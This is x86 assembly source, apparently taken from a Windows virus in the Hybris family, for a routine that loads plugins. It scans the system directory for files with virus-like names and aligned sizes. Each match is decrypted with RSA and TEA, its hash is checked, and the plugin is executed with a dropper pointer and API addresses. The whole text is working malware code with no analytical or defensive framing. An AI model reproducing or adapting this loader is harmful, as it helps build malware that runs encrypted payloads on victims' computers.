  IF MUAZZINS EQ TRUE

load_hybris_plugins:
       pushad

       sub esp,MAX_PATH+SIZEOF_WIN32_FIND_DATA
       mov ebp,esp

       lea esi,[ebp+MAX_PATH]

       push MAX_PATH
       push ebp
       call [_GetSystemDirectoryA]

       lea edi,[eax+ebp]
       mov eax, "*\"
       stosd

       push esi
       push ebp
       call [_FindFirstFileA]
       mov ebx,eax
       inc eax
       jz @@done

  @@checkthat:
       pushad

       mov ecx,[esi.WFD_nFileSizeLow]
       test ecx,ecx
       jz @@isnt_muazzin
       test ecx, 01111b                 ;aligned to 16 boundary?
       jnz @@isnt_muazzin

       add esi,WFD_szFileName
       mov eax,[esi]
       sub eax,[esi+8]
       and eax, 0ffffff00h              ;has a virus-like name?
       jnz @@isnt_muazzin

       sub edi,3
       movsd
       movsd
       movsd
       stosd

       pushad

       push eax
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push eax
       push FILE_SHARE_READ+FILE_SHARE_WRITE
       push GENERIC_READ
       push ebp
       call [_CreateFileA]
       mov ebx,eax
       inc eax
       jz @@exit

       push dwo [esp.Pushad_ecx]
       add dwo [esp],4
       push 40h
       call [_GlobalAlloc]
       mov [esp.Pushad_esi],eax
       test eax,eax
       jz @@close

       push 0
       mov ecx,esp

       push 0
       push ecx
       push dwo [esp.Pushad_ecx+4*3]
       push eax
       push ebx
       call [_ReadFile]
       pop dwo [esp.Pushad_eax]

  @@close:
       push ebx
       call [_CloseHandle]

  @@exit:
       popad
       test eax,eax
       jz @@isnt_muazzin

       push ecx
       push esi
       call decrypt_muazzin

       test eax,eax
       jz @@isnt_muazzin

       push esi

       push dwo [_GetProcAddress]
       push dwo [_GetModuleHandleA]
       push dwo [dropper_size]
       push dwo [dropper]
       push 0100b                     ;MT_APP

       push esp
       call esi

       add esp,5*4

       call [_GlobalFree]

  @@isnt_muazzin:
       popad

       push esi
       push ebx
       call [_FindNextFileA]
       test eax,eax
       jnz @@checkthat

  @@done:
       sub esp,-(MAX_PATH+SIZEOF_WIN32_FIND_DATA)
       popad
       ret 4


;arg1=buffer
;arg2=size
decrypt_muazzin:
       sub eax,eax
       pushad

       sub esp,BN_BYTE+4
       mov edx, esp                     ;edx==plain (hash+key)
       sub esp, BN_BYTE+4
       mov edi, esp                     ;edi=e

       mov esi,[esp.cPushad.Arg1+((BN_BYTE*2)+4+4)]
       mov eax,[esp.cPushad.Arg2+((BN_BYTE*2)+4+4)]

       lea ebx, [eax+esi-BN_BYTE]       ;ebx==rsa crypted (hash+key)

       push ebx                         ;from
       push edx                         ;where

       push edi                         ;e
       mov ecx,BN_DWORD
       mov eax,_E_
       stosd                            ;create e
       sub eax, eax
       rep stosd

       push ofs rsa_n                   ;n
       call rsa_main                    ;decriypt tea_key with RSA

       mov ecx,[esp.cPushad.Arg2+((BN_BYTE*2)+4+4)]
       shr ecx, 3                       ;ecx=number of TEA rounds

       mov edi,[esp.cPushad.Arg1+((BN_BYTE*2)+4+4)]
       mov esi, edx                     ;esi==tea32 key
       add edx, BN_BYTE                 ;edx==end tea32 key
  @@TEA:
       call TEA_Decrypt                 ;decrypt 64b with TEA
       add edi, 64/8                    ;get next area to decrypt
       add esi, 128/8                   ;get next TEA round key
       cmp esi, edx
       jb @@continue                    ;all key done?
       sub esi, BN_BYTE                 ;so back to start of TEA key
  @@continue:
       loop @@TEA

       sub edx, BN_BYTE                ;edx==tea32 key

       push edx                        ;result
       push dwo [esp.cPushad.Arg2+4+((BN_BYTE*2)+4+4)]
       sub dwo [esp],BN_BYTE
       push dwo [esp.cPushad.Arg1+4+4+((BN_BYTE*2)+4+4)]
       mov eax, [edx+16]
       mov ebx, [edx+20]
       mov ecx, [edx+24]
       mov edi, [edx+28]               ;128b hash
       call tea_hash

       xor edi, [edx+28]
       jnz @@done
       xor eax, [edx+16]
       jnz @@done
       xor ebx, [edx+20]        ;hash match!
       jnz @@done
       xor ecx, [edx+24]
       jnz @@done

  @@exec_it:
       mov dwo [esp.Pushad_eax+((BN_BYTE*2)+4+4)],esp

  @@done:
       add esp,((BN_BYTE*2)+4+4)
       popad
       ret 2*4

include hash128.inc
include xtea.inc
include rsalib.inc

  ENDIF
